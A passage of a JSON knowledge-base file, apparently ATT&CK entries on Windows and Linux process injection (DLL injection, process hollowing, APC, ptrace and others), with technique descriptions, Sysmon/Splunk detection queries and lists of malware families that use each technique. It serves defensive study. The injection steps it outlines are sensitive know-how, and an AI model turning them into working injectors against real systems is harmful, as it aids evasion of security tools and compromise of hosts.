    "Description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such asVirtualAllocExandWriteProcessMemory, then invoked withCreateRemoteThread(which calls theLoadLibraryAPI responsible for loading the DLL).[1]Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function ofLoadLibrary).[2][1]Another variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module'sAddressOfEntryPointbefore starting a new thread in the target process.[3]This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.[4]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "Detects": [
      "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. Sysmon Event ID 7 (Image loaded) can be used to monitor the loading of DLLs into processes. This is a particularly noisy event and can generate a large volume of data, so we recommend baselining and filtering out any known benign processes and module loads to help reduce the number of events that are produced.",
      "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such asCreateRemoteThreadand those that can be used to modify memory within another process, such asVirtualAllocEx/WriteProcessMemory, may be used for this technique.[1]Search for remote thread creations that start at LoadLibraryA or LoadLibraryW. Depending on the tool, it may provide additional information about the DLL string that is an argument to the function. If there is any security software that legitimately injects DLLs, it must be carefully whitelisted.Microsoft Windows allows for processes to remotely create threads within other processes of the same privilege level. This functionality is provided via the Windows API CreateRemoteThread. Both Windows and third-party software use this ability for legitimate purposes. For example, the Windows process csrss.exe creates threads in programs to send signals to registered callback routines. Both adversaries and host-based security software use this functionality to inject DLLs, but for very different purposes. An adversary is likely to inject into a program to evade defenses or bypass User Account Control, but a security program might do this to gain increased monitoring of API calls. One of the most common methods of DLL Injection is through the Windows API LoadLibrary.Allocate memory in the target program with VirtualAllocExWrite the name of the DLL to inject into this program with WriteProcessMemoryCreate a new thread and set its entry point to LoadLibrary using the API CreateRemoteThread.This behavior can be detected by looking for thread creations across processes, and resolving the entry point to determine the function name. If the function is LoadLibraryA or LoadLibraryW, then the intent of the remote thread is clearly to inject a DLL. When this is the case, the source process must be examined so that it can be ignored when it is both expected and a trusted process.",
      "Monitor for process being viewed that may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges.",
      "Monitor for process memory inconsistencies compared to DLL files on disk by checking memory ranges against a known copy of the legitimate module.[4]",
      "Monitor for changes made to processes that may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. Injecting a malicious DLL into a process is a common adversary TTP. Although the ways of doing this are numerous, mavinject.exe is a commonly used tool for doing so because it roles up many of the necessary steps into one, and is available within Windows. Attackers may rename the executable, so we also use the common argument \"INJECTRUNNING\" as a related signature here. Whitelisting certain applications may be necessary to reduce noise for this analytic.Analytic 1 - DLL Injection with Mavinject(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image=\"C:\\Windows\\SysWOW64\\mavinject.exe\" OR Image=\"C:\\Windows\\System32\\mavinject.exe\" OR CommandLine=\"/INJECTRUNNING\"\""
    ],
    "Procedure Examples": [
      "Aria-bodyhas the ability to inject itself into another process such as rundll32.exe and dllhost.exe.[5]",
      "BackdoorDiplomacyhas dropped legitimate software onto a compromised host and used it to execute malicious DLLs.[6]",
      "BADHATCHhas the ability to execute a malicious DLL by injecting intoexplorer.exeon a compromised machine.[7]",
      "BlackEnergyinjects its DLL component into svchost.exe.[8]",
      "TheBumblebeeloader can support theDijcommand which gives it the ability to inject DLLs into the memory of other processes.[9][10]",
      "DuringC0015, the threat actors used a DLL namedD8B3.dllthat was injected into the Winlogon process.[11]",
      "Carberp's bootkit can inject a malicious DLL into the address space of running processes.[12]",
      "Carbonhas a command to inject code into a process.[13]",
      "Cobalt Strikehas the ability to load DLLs via reflective injection.[14][15]",
      "ComRAThas injected its orchestrator DLL into explorer.exe.ComRAThas also injected its communications module into the victim's default browser to make C2 connections appear less suspicious as all network connections will be initiated by the browser process.[16][17]",
      "Contihas loaded an encrypted DLL into memory and then executes it.[18][19]",
      "DarkTortillacan use a .NET-based DLL namedRunPe6for process injection.[20]",
      "Derusbiinjects itself into the secure shell (SSH) process.[21]",
      "Duquwill inject itself into different processes to evade detection. The selection of the target process is influenced by the security software that is installed on the system (Duqu will inject into different processes depending on which security suite is installed on the infected host).[22]",
      "Dyreinjects into other processes to load modules.[23]",
      "Eliseinjects DLL files into iexplore.exe.[24][25]",
      "Emissaryinjects its DLL file into a newly spawned Internet Explorer process.[26]",
      "Emotethas been observed injecting in to Explorer.exe and other processes.[27][28][29]",
      "FinFisherinjects itself into various processes depending on whether it is low integrity or high integrity.[30][31]",
      "TheFunnyDreamFilepakMonitor component can inject into the Bka.exe process using theVirtualAllocEx,WriteProcessMemoryandCreateRemoteThreadAPIs to load the DLL component.[32]",
      "Gelsemiumhas the ability to inject DLLs into specific processes.[33]",
      "Get2has the ability to inject DLLs into processes.[34]",
      "Heyoka Backdoorcan inject a DLL into rundll32.exe for execution.[35]",
      "HIDEDRVinjects a DLL forDowndelphinto the explorer.exe process.[36]",
      "IronNetInjectorhas the ability to inject a DLL into running processes, including theIronNetInjectorDLL into explorer.exe.[37]",
      "If running in a Windows environment,Kazuarsaves a DLL to disk that is injected into the explorer.exe process to execute the payload.Kazuarcan also be configured to inject and execute within specific processes.[38]",
      "Koadiccan perform process injection by using a reflective DLL.[39]",
      "ALazarus Groupmalware sample performs reflective DLL injection.[40][41]",
      "Leviathanhas utilized techniques like reflective DLL loading to write a DLL into memory and load a shell that provides backdoor access to the victim.[42]",
      "Lizarhas used the PowerKatz plugin that can be loaded into the address space of a PowerShell process through reflective DLL loading.[43]",
      "Malteirohas injectedMispadu’s DLL into a process.[44]",
      "Matryoshkauses reflective DLL injection to inject the malicious library and execute the RAT.[45]",
      "Mazehas injected the malware DLL into a target process.[46][47]",
      "MegaCortexloadsinjecthelper.dllinto a newly createdrundll32.exeprocess.[48]",
      "Metamorfohas injected a malicious DLL into the Windows Media Player process (wmplayer.exe).[49]",
      "Mongallcan inject a DLL intorundll32.exefor execution.[35]",
      "TheNetwalkerDLL has been injected reflectively into the memory of a legitimate running process.[50]",
      "PipeMoncan inject its modules into various processes using reflective DLL loading.[51]",
      "PoisonIvycan inject a malicious DLL into a process.[52][53]",
      "PowerSploitcontains a collection of CodeExecution modules that inject code (DLL, shellcode) into a process.[54][55]",
      "PS1can inject its payload DLL Into memory.[56]",
      "Pupycan migrate into another process using reflective DLL injection.[57]",
      "An executable dropped onto victims byPutter Pandaaims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).[58]",
      "Ramsaycan useImprovedReflectiveDLLInjectionto deploy components.[59]",
      "After decrypting itself in memory,RARSTONEdownloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process. This \"downloaded\" file is actually not dropped onto the system.[60]",
      "RATANKBAperforms a reflective DLL injection using a given pid.[61][62]",
      "Remseccan perform DLL injection.[63]",
      "Sagerunexis designed to be dynamic link library (DLL) injected into an infected endpoint and executed directly in memory.[64]",
      "Saint Bothas injected its DLL component intoEhStorAurhn.exe.[65]",
      "SDBbothas the ability to inject a downloaded DLL into a newly created rundll32.exe process.[34]",
      "ShadowPadhas injected a DLL into svchost.exe.[66]",
      "Socksbotcreates a suspended svchost process and injects its DLL into it.[67]",
      "SombRATcan executeloadfromfile,loadfromstorage, andloadfrommemto inject a DLL  from disk, storage, or memory respectively.[56]",
      "Stuxnetinjects an entire DLL into an existing, newly created, or preselected trusted process.[68]",
      "Sykipotinjects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.[69]",
      "TA505has been seen injecting a DLL into winword.exe.[70]",
      "Taidoorcan perform DLL loading.[71][72]",
      "TajMahalhas the ability to inject DLLs for malicious plugins into running processes.[73]",
      "Tropic Trooperhas injected a DLL backdoor into dllhost.exe and svchost.exe.[74][75]",
      "Turlahas used Metasploit to perform reflective DLL injection in order to escalate privileges.[76][77]",
      "Uroburoscan use DLL injection to load embedded files and modules.[78]",
      "Wizard Spiderhas injected malicious DLLs into memory with read, write, and execute permissions.[79][80]",
      "ZxShellis injected into a shared SVCHOST process.[81]"
    ]
  },
  "T1055.002": {
    "Name": "Process Injection:Portable Executable Injection",
    "Description": "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process.PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such asVirtualAllocExandWriteProcessMemory, then invoked withCreateRemoteThreador additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references.[1]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "Detects": [
      "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such asCreateRemoteThreadand those that can be used to modify memory within another process, such asVirtualAllocEx/WriteProcessMemory, may be used for this technique.[1]",
      "Monitor for processes being viewed that may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges.",
      "Monitor for changes made to processes that may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges."
    ],
    "Procedure Examples": [
      "Brute Ratel C4has injectedLatrodectusinto the Explorer.exe process on comrpomised hosts.[2]",
      "Carbanakdownloads an executable and injects it directly into a new process.[3]",
      "DUSTPANcan inject its decrypted payload into another process.[4]",
      "Gootloadercan use its own PE loader to execute payloads in memory.[5]",
      "Gorgon Groupmalware can download a remote access tool,ShiftyBug, and inject into another process.[6]",
      "GreyEnergyhas a module to inject a PE binary into a remote process.[7]",
      "InvisiMolecan inject its backdoor as a portable executable into a target process.[8]",
      "Lizarcan execute PE files in the address space of the specified process.[9]",
      "Pikabot, following payload decryption, creates a process hard-coded into the dropped (e.g., WerFault.exe) and injects the decrypted core modules into it.[10]",
      "Rocke's miner, \"TermsHost.exe\", evaded defenses by injecting itself into Windows processes, including Notepad.exe.[11]",
      "Zeus Pandachecks processes on the system and if they meet the necessary requirements, it injects into that process.[12]"
    ]
  },
  "T1055.003": {
    "Name": "Process Injection:Thread Execution Hijacking",
    "Description": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.Thread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such asOpenThread. At this point the process can be suspended then written to, realigned to the injected code, and resumed viaSuspendThread,VirtualAllocEx,WriteProcessMemory,SetThreadContext, thenResumeThreadrespectively.[1]This is very similar toProcess Hollowingbut targets an existing process rather than creating a process in a suspended state.Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.",
    "Detects": [
      "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such asCreateRemoteThread,SuspendThread/SetThreadContext/ResumeThread, and those that can be used to modify memory within another process, such asVirtualAllocEx/WriteProcessMemory, may be used for this technique.[1]",
      "Monitor for processes being viewed that may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges.",
      "Monitor for changes made to processes that may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges."
    ],
    "Procedure Examples": [
      "Gazerperforms thread execution hijacking to inject its orchestrator into a running thread from a remote process.[2][3]",
      "Pikabotcan create a suspended instance of a legitimate process (e.g., ctfmon.exe), allocate memory within the suspended process corresponding toPikabot's core module, then redirect execution flow viaSetContextThreadAPI so that when the thread resumes thePikabotcore module is executed.[4]",
      "Trojan.Karaganycan inject a suspended thread of its own process into a new process and initiate via theResumeThreadAPI.[5]",
      "Waterbearcan use thread injection to inject shellcode into the process of security software.[6]"
    ]
  },
  "T1055.004": {
    "Name": "Process Injection:Asynchronous Procedure Call",
    "Description": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process.APC injection is commonly performed by attaching malicious code to the APC Queue[1]of a process's thread. Queued APC functions are executed when the thread enters an alterable state.[1]A handle to an existing victim process is first created with native Windows API calls such asOpenThread. At this pointQueueUserAPCcan be used to invoke a function (such asLoadLibrayApointing to a malicious DLL).A variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC.[2]AtomBombing[3]is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.[4]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "Detects": [
      "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such asSuspendThread/SetThreadContext/ResumeThread,QueueUserAPC/NtQueueApcThread, and those that can be used to modify memory within another process, such asVirtualAllocEx/WriteProcessMemory, may be used for this technique.[17]",
      "Monitor for processes being viewed that may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges.",
      "Monitor for changes made to processes that may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges."
    ],
    "Procedure Examples": [
      "Attorperforms the injection by attaching its code into the APC queue using NtQueueApcThread API.[5]",
      "BADHATCHcan inject itself into a newsvchost.exe -k netsvcsprocess using the asynchronous procedure call (APC) queue.[6][7]",
      "Bumblebeecan use asynchronous procedure call (APC) injection to execute commands received from C2.[8]",
      "Carberphas queued an APC routine to explorer.exe by calling ZwQueueApcThread.[9]",
      "FIN8has injected malicious code into a new svchost.exe process.[10]",
      "IcedIDhas usedZwQueueApcThreadto inject itself into remote processes.[11]",
      "InvisiMolecan inject its code into a trusted process via the APC queue.[12]",
      "Pillowminthas used the NtQueueApcThread syscall to inject code into svchost.exe.[13]",
      "Saint Bothas written its payload into a newly-createdEhStorAuthn.exeprocess usingZwWriteVirtualMemoryand executed it usingNtQueueApcThreadandZwAlertResumeThread.[14]",
      "Sardoniccan use theQueueUserAPCAPI to execute shellcode on a compromised machine.[15]",
      "TURNEDUPis capable of injecting code into the APC queue of a createdRundll32process as part of an \"Early Bird injection.\"[2]",
      "XLoaderinjects code into the APC queue usingNtQueueApcThreadAPI.[16]"
    ]
  },
  "T1055.005": {
    "Name": "Process Injection:Thread Local Storage",
    "Description": "Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process.TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using otherProcess Injectiontechniques such asProcess Hollowing.[1]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "Detects": [
      "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such asCreateRemoteThread,SuspendThread/SetThreadContext/ResumeThread, and those that can be used to modify memory within another process, such asVirtualAllocEx/WriteProcessMemory, may be used for this technique.[5]",
      "Monitor for processes being viewed that may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges.",
      "Monitor for changes made to processes that may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges."
    ],
    "Procedure Examples": [
      "Ursnifhas injected code into target processes via thread local storage callbacks.[2][3][4]"
    ]
  },
  "T1055.008": {
    "Name": "Process Injection:Ptrace System Calls",
    "Description": "Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process.Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.[1]Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex:malloc) then invoking that memory withPTRACE_SETREGSto set the register containing the next instruction to execute. Ptrace system call injection can also be done withPTRACE_POKETEXT/PTRACE_POKEDATA, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction).[1][2]Ptrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.[3]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "Detects": [
      "Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.[5][6][7][8]",
      "Monitor for processes being viewed that may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges.",
      "Monitor for changes made to processes that may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges."
    ],
    "Procedure Examples": [
      "PACEMAKERcan use PTRACE to attach to a targeted process to read process memory.[4]"
    ]
  },
  "T1055.009": {
    "Name": "Process Injection:Proc Memory",
    "Description": "Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process.Proc memory injection involves enumerating the memory of a process via the /proc filesystem (/proc/[pid]) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within/proc/[pid]/mapscan be overwritten using dd.[1][2][3]Other techniques such asDynamic Linker Hijackingmay be used to populate a target process with more available gadgets. Similar toProcess Hollowing, proc memory injection may target child processes (such as a backgrounded copy of sleep).[2]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "Detects": [
      "Monitor for changes made to /proc files that may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Users should not have permission to modify these in most cases."
    ],
    "Procedure Examples": [
      "KV Botnet Activityfinal payload installation includes mounting and binding to the\\/proc\\/filepath on the victim system to enable subsequent operation in memory while also removing on-disk artifacts.[4]"
    ]
  },
  "T1055.011": {
    "Name": "Process Injection:Extra Window Memory Injection",
    "Description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process.Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).[1]Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.[2][3]Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such asWriteProcessMemoryandCreateRemoteThread.[4]More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.[5][6]Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.",
    "Detects": [
      "Monitor for API calls related to enumerating and manipulating EWM such as GetWindowLong[2]and SetWindowLong[3]. Malware associated with this technique have also used SendNotifyMessage[8]to trigger the associated window procedure and eventual malicious injection.[4]"
    ],
    "Procedure Examples": [
      "Epichas overwritten the function pointer in the extra window memory of Explorer's Shell_TrayWnd in order to execute malicious code in the context of the explorer.exe process.[7]",
      "Power Loaderoverwrites Explorer’s Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming (ROP) chain and create a malicious thread within Explorer.exe.[5][6]"
    ]
  },
  "T1055.012": {
    "Name": "Process Injection:Process Hollowing",
    "Description": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such asCreateProcess, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such asZwUnmapViewOfSectionorNtUnmapViewOfSectionbefore being written to, realigned to the injected code, and resumed viaVirtualAllocEx,WriteProcessMemory,SetThreadContext, thenResumeThreadrespectively.[1][2]This is very similar toThread Local Storagebut creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.",
    "Detects": [
      "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such asCreateRemoteThread,SuspendThread/SetThreadContext/ResumeThread, and those that can be used to modify memory within another process, such asVirtualAllocEx/WriteProcessMemory, may be used for this technique.[2]",
      "Monitor for processes being viewed that may inject malicious code into suspended and hollowed processes in order to evade process-based defenses.",
      "Monitor for newly executed processes that may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Adversaries may start legitimate processes and then use their memory space to run malicious code. This analytic looks for common Windows processes that have been abused this way in the past; when the processes are started for this purpose they may not have the standard parent that we would expect. This list is not exhaustive, and it is possible for cyber actors to avoid this discepency. These signatures only work if Sysmon reports the parent process, which may not always be the case if the parent dies before sysmon processes the event.Analytic 1 - Processes Started From Irregular Parents(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") AND ParentImage!=\"?\" AND ParentImage!=\"C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunk-regmon.exe\" AND ParentImage!=\"C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunk-powershell.exe\" AND((Image=\"C:\\Windows\\System32\\smss.exe\" AND (ParentImage!=\"C:\\Windows\\System32\\smss.exe\" AND ParentImage!=\"System\")) OR(Image=\"C:\\Windows\\System32\\csrss.exe\" AND (ParentImage!=\"C:\\Windows\\System32\\smss.exe\" AND ParentImage!=\"C:\\Windows\\System32\\svchost.exe\")) OR(Image=\"C:\\Windows\\System32\\wininit.exe\" AND ParentImage!=\"C:\\Windows\\System32\\smss.exe\") OR(Image=\"C:\\Windows\\System32\\winlogon.exe\" AND ParentImage!=\"C:\\Windows\\System32\\smss.exe\") OR(Image=\"C:\\Windows\\System32\\lsass.exe\" and ParentImage!=\"C:\\Windows\\System32\\wininit.exe\") OR(Image=\"C:\\Windows\\System32\\LogonUI.exe\" AND (ParentImage!=\"C:\\Windows\\System32\\winlogon.exe\" AND ParentImage!=\"C:\\Windows\\System32\\wininit.exe\")) OR(Image=\"C:\\Windows\\System32\\services.exe\" AND ParentImage!=\"C:\\Windows\\System32\\wininit.exe\") OR(Image=\"C:\\Windows\\System32\\spoolsv.exe\" AND ParentImage!=\"C:\\Windows\\System32\\services.exe\") OR(Image=\"C:\\Windows\\System32\\taskhost.exe\" AND (ParentImage!=\"C:\\Windows\\System32\\services.exe\" AND ParentImage!=\"C:\\Windows\\System32\\svchost.exe\")) OR(Image=\"C:\\Windows\\System32\\taskhostw.exe\" AND (ParentImage!=\"C:\\Windows\\System32\\services.exe\" AND ParentImage!=\"C:\\Windows\\System32\\svchost.exe\")) OR(Image=\"C:\\Windows\\System32\\userinit.exe\" AND (ParentImage!=\"C:\\Windows\\System32\\dwm.exe\" AND ParentImage!=\"C:\\Windows\\System32\\winlogon.exe\")))",
      "Monitor for changes made to processes that may inject malicious code into suspended and hollowed processes in order to evade process-based defenses."
    ],
    "Procedure Examples": [
      "Agent Teslahas used process hollowing to create and manipulate processes through sections of unmapped memory by reallocating that space with its malicious code.[3]",
      "Astarothcan create a new process in a suspended state from a targeted legitimate process in order to unmap its memory and replace it with malicious code.[4][5]",
      "Azorultcan decrypt the payload into memory, create a new suspended process of itself, then inject a decrypted payload to the new process and resume new process execution.[6]",
      "BADNEWShas a command to download an .exe and use process hollowing to inject it into a new process.[7][8]",
      "Bandookhas been launched by starting iexplore.exe and replacing it withBandook's payload.[9][10][11]",
      "Bazarcan inject into a target process including Svchost, Explorer, and cmd using process hollowing.[12][13]",
      "BBSRAThas been seen loaded into msiexec.exe through process hollowing to hide its execution.[14]",
      "BlackByteused process hollowing for defense evasion purposes.[15]",
      "Clamblingcan execute binaries through process hollowing.[16]",
      "Cobalt Strikecan use process hollowing for execution.[17][18]",
      "DarkGateleverages process hollowing techniques to evade detection, such as decrypting the content of an encrypted PE file and injecting it into the process vbc.exe.[19][20]",
      "Denisperformed process hollowing through the API calls CreateRemoteThread, ResumeThread, and Wow64SetThreadContext.[21]",
      "Dtrackhas used process hollowing shellcode to target a predefined list of processes from%SYSTEM32%.[22]",
      "Duquis capable of loading executable code via process hollowing.[23]",
      "Emotetuses a copy ofcertutil.exestored in a temporary directory for process hollowing, starting the program in a suspended state before loading malicious code.[24]",
      "Gootloadercan inject its Delphi executable into ImagingDevices.exe using a process hollowing technique.[25][26]",
      "Gorgon Groupmalware can use process hollowing to inject one of its trojans into another process.[27]",
      "IcedIDcan inject aCobalt Strikebeacon into cmd.exe via process hallowing.[28]",
      "ISMInjectorhollows out a newly created process RegASM.exe and injects its payload into the hollowed process.[29]",
      "Kimsukyhas used a file injector DLL to spawn a benign process on the victim's system and inject the malicious payload into it via process hollowing.[30]",
      "Lokibothas used process hollowing to inject itself into legitimate Windows process.[31][32]",
      "Lumma Stealerhas used process hollowing leveraging a legitimate program such as \"BitLockerToGo.exe\" to inject a malicious payload.[33]",
      "menuPasshas used process hollowing in iexplore.exe to load theRedLeavesimplant.[34]",
      "TheNETWIREpayload has been injected into benign Microsoft executables via process hollowing.[35][36]",
      "SomeOrzversions have an embedded DLL known as MockDll that uses process hollowing andRegsvr32to execute another payload.[37]",
      "APatchworkpayload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe.[38]",
      "QakBotcan use process hollowing to execute its main payload.[39]",
      "Raspberry Robinwill execute a legitimate process, then suspend it to inject code for aTorclient into the process, followed by resumption of the process to enableTorclient execution.[40]",
      "RCSessioncan launch itself from a hollowed svchost.exe process.[41][16][42]",
      "TheSaint Botloader has used API calls to spawnMSBuild.exein a suspended state before injecting the decryptedSaint Botbinary into it.[43]",
      "Smoke Loaderspawns a new copy of c:\\windows\\syswow64\\explorer.exe and then replaces the executable code in memory with malware.[44][45]",
      "Snip3can use RunPE to execute malicious payloads within a hollowed Windows process.[46][47]",
      "TA2541has used process hollowing to execute CyberGate malware.[48]",
      "AThreat Group-3390tool can spawnsvchost.exeand inject the payload into that process.[49][50]",
      "TrickBotinjects into the svchost.exe process.[51][52][53][54]",
      "Ursnifhas used process hollowing to inject into child processes.[55]",
      "WhisperGatehas the ability to inject its fourth stage into a suspended process created by the legitimate Windows utilityInstallUtil.exe.[56][57]",
      "Woody RATcan create a suspended notepad process and write shellcode to delete a file into the suspended process usingNtWriteVirtualMemory.[58]",
      "XLoaderuses process hollowing by injecting itself into theexplorer.exeprocess and other files ithin the WindowsSysWOW64directory.[59][60][61]"
    ]
  },
  "T1055.013": {
    "Name": "Process Injection:Process Doppelgänging",
